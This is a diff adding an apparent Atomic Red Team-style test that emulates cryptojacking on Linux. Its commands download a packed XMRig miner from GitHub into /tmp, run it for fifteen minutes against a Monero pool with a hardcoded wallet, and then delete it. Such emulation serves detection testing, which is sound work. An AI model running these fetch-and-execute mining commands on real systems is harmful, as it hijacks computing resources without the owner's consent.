@@ -1,0 +1,20 @@
+attack_technique: Test
+display_name: Xmrig
+atomic_tests:
+- name: Run Xmrig
+  description: Download and run Xmrig
+  supported_platforms:
+    - linux
+  executor:
+    command: |
+      wget https://github.com/sysdig/TR-Blogs/raw/main/xmrig-upx-linux-static-x64.tar -O /tmp/xmrig.tar 2>/dev/null
+      tar -xf /tmp/xmrig.tar -C /tmp
+      ls -al /tmp
+      chmod +x /tmp/xmrig-6.18.0/xmrig
+      ls -al /tmp/xmrig-6.18.0
+      /tmp/xmrig-6.18.0/xmrig -a rx/0 -o stratum+ssl://xmr-us-east1.nanopool.org:10343 -u 43NyzPLNUxSXbAgK9szPpvBxXhajTwAT1YEWHU6YAKcpfBuiw4DgH5LNbmPAk5m5A5AAhkbFWGu2PTdC1EoDnwpZEHnVCco 1>/dev/null & XMRIG_PID=$!
+      sleep 900 && kill -9 $XMRIG_PID && wait $XMRIG_PID 2>/dev/null
+    cleanup_command: |
+      rm -rf /tmp/xmrig*
+    name: bash
+    elevation_required: false
